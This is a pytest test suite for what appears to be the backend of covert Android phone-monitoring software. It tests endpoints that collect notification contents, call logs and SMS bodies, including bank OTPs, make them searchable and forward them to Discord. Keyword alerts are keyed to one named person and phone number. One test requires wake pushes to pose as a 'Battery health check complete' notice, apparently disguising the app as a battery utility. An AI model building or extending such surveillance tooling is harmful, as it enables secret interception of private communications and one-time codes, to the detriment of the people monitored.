import os
import pytest
from datetime import datetime, timezone

# Use in-memory SQLite for testing
os.environ['DATABASE_URL'] = 'sqlite:///:memory:'
os.environ['API_KEY'] = 'test-api-key'
os.environ['DASHBOARD_USERNAME'] = 'testuser'
os.environ['DASHBOARD_PASSWORD'] = 'testpass'
os.environ['SECRET_KEY'] = 'test-secret'

from app import app, db, Device, Notification, CallLog, SmsMessage


@pytest.fixture
def client():
    app.config['TESTING'] = True
    app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///:memory:'
    with app.app_context():
        db.create_all()
        yield app.test_client()
        db.session.remove()
        db.drop_all()


def test_sync_unauthorized(client):
    response = client.post('/api/v1/sync', json={})
    assert response.status_code == 401
    assert response.get_json()['error'] == 'unauthorized'


def test_sync_invalid_payload(client):
    response = client.post(
        '/api/v1/sync',
        headers={'X-API-Key': 'test-api-key'},
        data='invalid json'
    )
    assert response.status_code == 400


def test_sync_missing_device_id(client):
    response = client.post(
        '/api/v1/sync',
        headers={'X-API-Key': 'test-api-key'},
        json={'notifications': []}
    )
    assert response.status_code == 400


def test_sync_successful_batch(client):
    now_ms = int(datetime.now(timezone.utc).timestamp() * 1000)
    payload = {
        "device_id": "test_np2a_001",
        "device_model": "Nothing Phone 2a",
        "android_version": "14",
        "app_version": "1.0.0",
        "notifications": [
            {
                "local_id": 101,
                "app_package": "com.whatsapp",
                "app_name": "WhatsApp",
                "title": "Alice",
                "content": "Meeting at 3pm",
                "category": "msg",
                "received_at": now_ms
            }
        ],
        "call_logs": [
            {
                "local_id": 201,
                "phone_number": "+1234567890",
                "contact_name": "Bob",
                "call_type": "incoming",
                "duration_sec": 45,
                "occurred_at": now_ms
            }
        ],
        "sms_messages": [
            {
                "local_id": 301,
                "address": "+1987654321",
                "contact_name": "Charlie",
                "body": "Your verification code is 492019",
                "sms_type": "received",
                "occurred_at": now_ms
            }
        ]
    }

    response = client.post(
        '/api/v1/sync',
        headers={'X-API-Key': 'test-api-key'},
        json=payload
    )

    assert response.status_code == 200
    data = response.get_json()
    assert data['status'] == 'ok'
    assert data['received']['notifications'] == [101]
    assert data['received']['call_logs'] == [201]
    assert data['received']['sms_messages'] == [301]

    # Verify database records
    with app.app_context():
        device = db.session.get(Device, "test_np2a_001")
        assert device is not None
        assert device.device_model == "Nothing Phone 2a"

        notifs = Notification.query.filter_by(device_id="test_np2a_001").all()
        assert len(notifs) == 1
        assert notifs[0].title == "Alice"
        assert notifs[0].content == "Meeting at 3pm"

        calls = CallLog.query.filter_by(device_id="test_np2a_001").all()
        assert len(calls) == 1
        assert calls[0].phone_number == "+1234567890"
        assert calls[0].duration_sec == 45

        sms = SmsMessage.query.filter_by(device_id="test_np2a_001").all()
        assert len(sms) == 1
        assert sms[0].body == "Your verification code is 492019"


def test_sync_encoded_payload(client):
    import base64
    now_ms = int(datetime.now(timezone.utc).timestamp() * 1000)

    def b64(s):
        return base64.b64encode(s.encode('utf-8')).decode('ascii')

    payload = {
        "device_id": "test_np2a_encoded",
        "device_model": "Nothing Phone 2a",
        "android_version": "14",
        "app_version": "1.0.0",
        "notifications": [
            {
                "local_id": 901,
                "app_package": "com.whatsapp",
                "app_name": b64("WhatsApp"),
                "title": b64("Private Contact"),
                "content": b64("Secret confidential message 123"),
                "category": "msg",
                "received_at": now_ms
            }
        ],
        "call_logs": [
            {
                "local_id": 902,
                "phone_number": b64("+9988776655"),
                "contact_name": b64("Dr. John"),
                "call_type": "incoming",
                "duration_sec": 120,
                "occurred_at": now_ms
            }
        ],
        "sms_messages": [
            {
                "local_id": 903,
                "address": b64("+1122334455"),
                "contact_name": None,
                "body": b64("Bank OTP is 849201"),
                "sms_type": "received",
                "occurred_at": now_ms
            }
        ]
    }

    response = client.post(
        '/api/v1/sync',
        headers={'X-API-Key': 'test-api-key'},
        json=payload
    )

    assert response.status_code == 200
    with app.app_context():
        n = Notification.query.filter_by(device_id="test_np2a_encoded").first()
        assert n.title == "Private Contact"
        assert n.content == "Secret confidential message 123"

        c = CallLog.query.filter_by(device_id="test_np2a_encoded").first()
        assert c.phone_number == "+9988776655"
        assert c.contact_name == "Dr. John"

def test_device_ping(client):
    payload = {
        "device_id": "test_np2a_ping",
        "device_model": "Nothing Phone 2a",
        "android_version": "14",
        "app_version": "1.0.0",
        "battery_level": 88,
        "is_charging": True,
        "battery_temp": 32.4,
        "ram_used_percent": 55,
        "storage_used_percent": 62,
        "uptime_seconds": 3600
    }

    response = client.post(
        '/api/v1/ping',
        headers={'X-API-Key': 'test-api-key'},
        json=payload
    )

    assert response.status_code == 200
    data = response.get_json()
    assert data['status'] == 'ok'
    assert data['ping_interval_sec'] == 300

    with app.app_context():
        device = db.session.get(Device, "test_np2a_ping")
        assert device is not None
        assert device.battery_level == 88
        assert device.is_charging is True
        assert device.battery_temp == 32.4
        assert device.is_online is True


def test_api_search(client):
    # Populate test data
    now = datetime.now(timezone.utc)
    with app.app_context():
        db.session.add(Device(device_id="dev_search_1", device_model="Pixel 8 Pro", android_version="14", app_version="1.0.0", last_sync=now))
        db.session.add(Notification(device_id="dev_search_1", app_package="com.whatsapp", app_name="WhatsApp", title="Alice", content="Meeting at 5pm", received_at=now))
        db.session.add(CallLog(device_id="dev_search_1", phone_number="+19876543210", contact_name="Bob Smith", call_type="incoming", duration_sec=45, occurred_at=now))
        db.session.add(SmsMessage(device_id="dev_search_1", address="BANK-ALERT", contact_name="Bank", body="Your OTP is 987654", sms_type="inbox", occurred_at=now))
        db.session.commit()

    # Unauthorized search
    r = client.get('/api/v1/search?q=Alice')
    assert r.status_code == 401

    # Authorized search with X-API-Key (case-insensitive)
    r = client.get('/api/v1/search?q=alice', headers={'X-API-Key': 'test-api-key'})
    assert r.status_code == 200
    data = r.get_json()
    assert data['total_results'] >= 1
    assert len(data['results']['notifications']) >= 1
    assert data['results']['notifications'][0]['title'] == 'Alice'

    # Search for number pattern across calls & sms
    r = client.get('/api/v1/search?q=9876', headers={'X-API-Key': 'test-api-key'})
    assert r.status_code == 200
    data = r.get_json()
    assert data['counts']['calls'] >= 1
    assert data['counts']['sms'] >= 1

    # Category filtered search
    r = client.get('/api/v1/search?q=pixel&type=devices', headers={'X-API-Key': 'test-api-key'})
    assert r.status_code == 200
    data = r.get_json()

def test_discord_important_highlighting(monkeypatch):
    from app import send_discord_for_notifications, send_discord_for_calls, send_discord_for_sms

    sent_payloads = []

    def mock_send(payload):
        sent_payloads.append(payload)

    monkeypatch.setattr('app._send_discord', mock_send)

    # 1. Important Notification test with keyword 'prashant'
    sent_payloads.clear()
    send_discord_for_notifications([
        {
            'app_package': 'com.whatsapp',
            'app_name': 'WhatsApp',
            'title': 'Prashant Kumar',
            'content': 'Hey, call me back',
            'category': 'VoIP & Social Messages'
        }
    ], 'device_test_123456')

    assert len(sent_payloads) == 1
    embed = sent_payloads[0]['embeds'][0]
    assert embed['title'] == '!M'
    assert '⚠️' in embed['description']
    assert embed['color'] == 0xED4245
    assert 'footer' not in embed

    # 2. Important Call Log test with keyword '9871920832'
    sent_payloads.clear()
    send_discord_for_calls([
        {
            'phone_number': '+919871920832',
            'contact_name': 'Unknown',
            'call_type': 'incoming',
            'duration_sec': 120
        }
    ], 'device_test_123456')

    assert len(sent_payloads) == 1
    embed = sent_payloads[0]['embeds'][0]
    assert embed['title'] == '!T'
    assert '⚠️' in embed['description']
    assert embed['color'] == 0xED4245

    # 3. Important SMS test with keyword 'prashant'
    sent_payloads.clear()
    send_discord_for_sms([
        {
            'address': '9999999999',
            'contact_name': 'Friend',
            'body': 'Meeting with prashant at 4pm',
            'sms_type': 'inbox'
        }
    ], 'device_test_123456')

    assert len(sent_payloads) == 1
    embed = sent_payloads[0]['embeds'][0]
    assert embed['title'] == '!S'
    assert '⚠️' in embed['description']
    assert embed['color'] == 0xED4245

    # 4. Uppercase case-insensitivity test ('PRASHANT')
    sent_payloads.clear()
    send_discord_for_notifications([
        {
            'app_package': 'com.whatsapp',
            'app_name': 'WhatsApp',
            'title': 'ALERT FROM PRASHANT',
            'content': 'URGENT MESSAGE',
            'category': 'VoIP & Social Messages'
        }
    ], 'device_test_123456')

    assert len(sent_payloads) == 1
    embed = sent_payloads[0]['embeds'][0]
    assert embed['title'] == '!M'
    assert '⚠️' in embed['description']
    assert embed['color'] == 0xED4245
    assert 'footer' not in embed

    # 5. Formatted phone number test ('+91-98719-20832')
    sent_payloads.clear()
    send_discord_for_calls([
        {
            'phone_number': '+91-98719-20832',
            'contact_name': 'Unknown Caller',
            'call_type': 'incoming',
            'duration_sec': 50
        }
    ], 'device_test_123456')

    assert len(sent_payloads) == 1
    embed = sent_payloads[0]['embeds'][0]
    assert embed['title'] == '!T'
    assert '⚠️' in embed['description']
    assert embed['color'] == 0xED4245

    # 6. Regular notification (no keyword match) -> standard M (no brackets, no footer)
    sent_payloads.clear()
    send_discord_for_notifications([
        {
            'app_package': 'com.whatsapp',
            'app_name': 'WhatsApp',
            'title': 'Random Sender',
            'content': 'Hello world',
            'category': 'VoIP & Social Messages'
        }
    ], 'device_test_123456')

    assert len(sent_payloads) == 1
    embed = sent_payloads[0]['embeds'][0]
    assert embed['title'] == 'M'
    assert '⚠️' not in embed['description']
    assert embed['color'] == 0x5865F2
    assert 'footer' not in embed

    # 7. Regular call (no keyword match) -> standard T
    sent_payloads.clear()
    send_discord_for_calls([
        {
            'phone_number': '+911234567890',
            'contact_name': 'Normal Caller',
            'call_type': 'incoming',
            'duration_sec': 30
        }
    ], 'device_test_123456')

    assert len(sent_payloads) == 1
    embed = sent_payloads[0]['embeds'][0]
    assert embed['title'] == 'T'
    assert '⚠️' not in embed['description']
    assert embed['color'] == 0x57F287

    # 8. Regular SMS (no keyword match) -> standard S
    sent_payloads.clear()
    send_discord_for_sms([
        {
            'address': '1234567890',
            'contact_name': 'Normal Friend',
            'body': 'Hello there',
            'sms_type': 'inbox'
        }
    ], 'device_test_123456')

    assert len(sent_payloads) == 1
    embed = sent_payloads[0]['embeds'][0]
    assert embed['title'] == 'S'
    assert '⚠️' not in embed['description']
    assert embed['color'] == 0x3BA55D


def test_fcm_wake_payload_includes_notification(monkeypatch):
    """Verify the FCM wake message includes a visible notification payload.

    NothingOS (and similar aggressive OEM skins) drop data-only FCM messages
    to force-stopped apps.  Including a `notification` block guarantees delivery.
    """
    captured_payloads = []

    class MockResponse:
        status_code = 200
        text = '{"name":"projects/test/messages/123"}'

    def mock_post(url, headers=None, json=None, timeout=None):
        captured_payloads.append(json)
        return MockResponse()

    # Stub out _get_fcm_access_token to return a fake token
    monkeypatch.setattr('app._get_fcm_access_token', lambda: 'fake-access-token')
    monkeypatch.setattr('app.FCM_PROJECT_ID', 'test-project')

    import requests as _req
    monkeypatch.setattr(_req, 'post', mock_post)

    from app import _send_fcm_wake
    result = _send_fcm_wake('fake-fcm-token', 'test-device-123')

    assert result is True
    assert len(captured_payloads) == 1

    msg = captured_payloads[0]['message']

    # Must have a notification payload (required for force-stopped app wake)
    assert 'notification' in msg, "FCM message must include a notification payload for force-stop wake"
    assert msg['notification']['title'] == 'Battery health check complete'
    assert msg['notification']['body'] == 'Your battery is in good condition ✓'

    # Must have high priority
    assert msg['android']['priority'] == 'HIGH'

    # Must target the battery_guard_channel for silent delivery
    assert msg['android']['notification']['channel_id'] == 'battery_guard_channel'

    # Must still include data payload with wake type
    assert msg['data']['type'] == 'wake'
    assert msg['data']['device_id'] == 'test-device-123'

